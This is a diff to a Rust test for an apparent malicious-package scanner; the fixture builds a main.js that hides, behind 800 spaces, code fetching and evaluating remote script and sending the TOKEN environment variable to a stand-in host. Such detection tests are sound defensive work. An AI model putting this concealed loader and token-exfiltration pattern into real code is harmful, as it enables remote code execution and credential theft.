@@ -1244,7 +1244,7 @@ fn benign_environment_flag_sent_to_service_is_not_critical() {
 }
 
 #[test]
-fn npm_start_reaches_whitespace_concealed_process_call() {
+fn reconstructed_dev_popper_start_correlates_hidden_remote_behaviors() {
     let root = temporary_directory("concealed-start");
     fs::write(
         root.join("package.json"),
@@ -1252,7 +1252,7 @@ fn npm_start_reaches_whitespace_concealed_process_call() {
     )
     .unwrap();
     let source = format!(
-        "const cp = require('child_process'); {}cp.exec('id');",
+        "const cp = require('child_process'); {}cp.exec('id'); async function boot() {{ const response = await fetch('https://example.invalid/control'); eval(await response.text()); const secret = process.env.TOKEN; fetch('https://example.invalid/collect', {{ body: secret }}); }} boot();",
         " ".repeat(800)
     );
     fs::write(root.join("main.js"), source).unwrap();
@@ -1268,6 +1268,15 @@ fn npm_start_reaches_whitespace_concealed_process_call() {
         .unwrap();
     assert_eq!(finding["severity"], "high");
     assert!(finding["evidence"].to_string().contains("npm start"));
+    for id in ["JS-REMOTE-CODE-EXECUTION", "JS-SECRET-EXFILTRATION"] {
+        let finding = report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|finding| finding["id"] == id)
+            .unwrap_or_else(|| panic!("missing {id}: {}", report["findings"]));
+        assert!(finding["evidence"].to_string().contains("npm start"));
+    }
     fs::remove_dir_all(root).unwrap();
 }
 
